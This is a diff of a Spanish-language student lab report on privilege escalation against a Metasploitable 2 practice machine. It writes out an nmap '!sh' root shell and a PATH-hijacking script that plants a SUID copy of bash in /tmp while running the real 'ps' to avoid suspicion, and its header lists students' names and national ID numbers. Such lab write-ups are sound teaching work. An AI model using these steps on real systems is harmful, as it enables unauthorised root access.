@@ -5,7 +5,7 @@
 | Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
 | :--- | :---: | :---: | :--- |
 | Gil, Jesús | 30175126 | 8 | 14-11-2025|
-| Guilarte, Andrés | 30246084 | 8 | 014-11-2025 |
+| Guilarte, Andrés | 30246084 | 8 | 14-11-2025 |
 
 **Grupo:** 4
 
@@ -62,15 +62,47 @@ Eres el equipo de **Escalada de Privilegios**. Tienes acceso como usuario limita
 
 ### Preparación: Establecer Acceso
 
-Se conectó desde la máquina "Analista", la máquina atacante, mediante el protocolo ssh usando el shortcut creado previamente por el equipo 2, luego de ello se ejecutaron los coamndos whoami e id para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficiar que efectivamente se accdeió con el usaurio "msfadmin" de la máquina objetvio desde la máquina atacante.
+Se conectó desde la máquina "Analista", la máquina atacante, mediante el protocolo ssh. En nuestro caso, dado que esta fase se realizó de forma aislada y no se contaba con la configuración previa del cliente SSH, fue necesario forzar el uso de algoritmos de clave de host y clave pública antiguos (`ssh-rsa`) que son requeridos por el servidor SSH obsoleto de Metasploitable 2.
 
-`ssh msfadmin@192.168.100.20`
+Ejecuta esto para forzar aceptación de ssh-rsa solo para esta conexión:
+`ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20`
 
-`whoami`
+![Conexión SSH Forzada](https://i.imgur.com/uT5YY2h.png)
 
-`id`
+```sh
+┌──(kali㉿kali)-[~]
+└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20
+msfadmin@192.168.100.20's password: 
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 
-Luego de ello, se procedió a crear el directorio de trabajo con el comando mkdir, donde se dejaran los archivos de evidencia necesarios para demostrar la escalada de privilegios exitosa y por último se uso el comando cd para cambiar el directorio actaul al creado para comprobar que fue creado sin problemas
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+Last login: Fri Nov 14 03:57:16 2025
+msfadmin@metasploitable:~$ 
+```
+
+![Comprobación de usuario (SSH)](https://i.imgur.com/mSgZNIX.png)
+
+*Figura: Captura de la comprobación de usuario tras la conexión SSH.*
+
+Luego de ello se ejecutaron los coamndos `whoami` e `id` para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficiar que efectivamente se accdeió con el usaurio "msfadmin" de la máquina objetvio desde la máquina atacante.
+
+```sh
+msfadmin@metasploitable:~$ whoami
+msfadmin
+msfadmin@metasploitable:~$ id
+uid=1001(msfadmin) gid=1001(msfadmin) groups=1001(msfadmin)
+```
+
+Luego de ello, se procedió a crear el directorio de trabajo con el comando mkdir, donde se dejaran los archivos de evidencia necesarios para demostrar la escalada de privilegios exitosa y por último se uso el comando cd para cambiar el directorio actaul al creado para comprobar que fue creado sin problemas.
 
 `mkdir -p /tmp/equipo4\_privesc`
 
@@ -108,7 +140,7 @@ Posteriormente se ejecutó `nmap> !sh` para abrir una shell, una shell es un pro
 
 Para comprobar que efectivamente ahora se está en el usuario root se ejecutaron los coamndos `whoami` y `id` para verificar el usuario actual y sus diferentes IDs correspondientes a su rol dentro del sistema dando como resultado la escalada exitosa como se puede ver en la imagen de abajo.
 
-![acceso-root](image-3.png)
+![acceso-root](https://imgur.com/uT5YY2h)
 
 Por último, se ejecutó `echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt` para escribir dentro u=de un archivo txt ubicado en la carpeta root un mensaje que sirva como prueba irrefutable de que se logró la escalada de privilegios en el sistema.
 
@@ -397,35 +429,39 @@ Debido a que no se contaba con el archivo del exploit (`raptor_udf2.so`) en la m
 
 **Contexto**
 
-Si un script ejecutado como root usa comandos sin ruta absoluta, podemos crear nuestro propio comando malicioso.
+El "Path Hijacking" o secuestro de ruta es una técnica que explota la forma en que los sistemas operativos buscan ejecutables. Si un script o programa ejecutado con privilegios elevados (como `root`) llama a un comando sin especificar su ruta absoluta (por ejemplo, llama a `ps` en lugar de `/bin/ps`), podemos engañar al sistema para que ejecute nuestro propio script malicioso en su lugar.
+
+Para ello, modificamos la variable de entorno `PATH` del usuario, añadiendo al principio una ruta a un directorio que controlamos. Cuando el sistema busque el comando, lo encontrará primero en nuestro directorio y lo ejecutará.
 
 **Procedimiento**
 
-\# Crear directorio para nuestros binarios maliciosos
+Se siguieron los siguientes pasos para preparar el ataque:
 
-mkdir /tmp/hijack
+1.  **Crear un directorio malicioso:** Se creó un directorio en `/tmp` para alojar nuestro script.
+2.  **Crear un script falso:** Se creó un script llamado `ps` que:
+    *   Copia la shell (`/bin/bash`) a `/tmp/rootbash`.
+    *   Le asigna el bit SUID (`chmod +s`), para que se ejecute como `root`.
+    *   Ejecuta el comando `ps` real (`/bin/ps`) para no levantar sospechas.
+3.  **Modificar el PATH:** Se antepuso nuestro directorio `/tmp/hijack` a la variable `PATH`.
 
-cd /tmp/hijack
+A continuación se muestran los comandos ejecutados:
 
-\# Crear "comando" malicioso (ejemplo: ps)
+```sh
+root@metasploitable:/home/msfadmin# mkdir /tmp/hijack
+root@metasploitable:/home/msfadmin# cd /tmp/hijack
+root@metasploitable:/tmp/hijack# echo '#!/bin/bash' > ps
+root@metasploitable:/tmp/hijack# echo 'cp /bin/bash /tmp/rootbash' >> ps
+root@metasploitable:/tmp/hijack# echo 'chmod +s /tmp/rootbash' >> ps
+root@metasploitable:/tmp/hijack# echo '/bin/ps' >> ps
+root@metasploitable:/tmp/hijack# chmod +x ps
+root@metasploitable:/tmp/hijack# export PATH=/tmp/hijack:$PATH
+```
 
-echo '#!/bin/bash' > ps
+Una vez preparado el entorno, solo queda esperar a que un script o proceso privilegiado ejecute el comando `ps`. Al hacerlo, se creará el binario `/tmp/rootbash` con permisos SUID, permitiendo la escalada de privilegios.
 
-echo 'cp /bin/bash /tmp/rootbash' >> ps
+![Path Hijacking](https://i.imgur.com/n8YWgkb.png)
 
-echo 'chmod +s /tmp/rootbash' >> ps
-
-echo '/bin/ps' >> ps  # Ejecutar el ps real para no levantar sospechas
-
-chmod +x ps
-
-\# Modificar PATH para que busque primero en nuestro directorio
-
-export PATH=/tmp/hijack:$PATH
-
-\# Ahora, si algún script con sudo ejecuta "ps" sin ruta absoluta...
-
-\# (Esto requiere encontrar tal script primero)
+En nuestro caso, esta técnica resultó ser la más fluida y fácil de ejecutar, ya que solo requiere la preparación del entorno y esperar a que un proceso vulnerable se active, sin necesidad de exploits complejos o configuraciones específicas.
 
 -----
 **
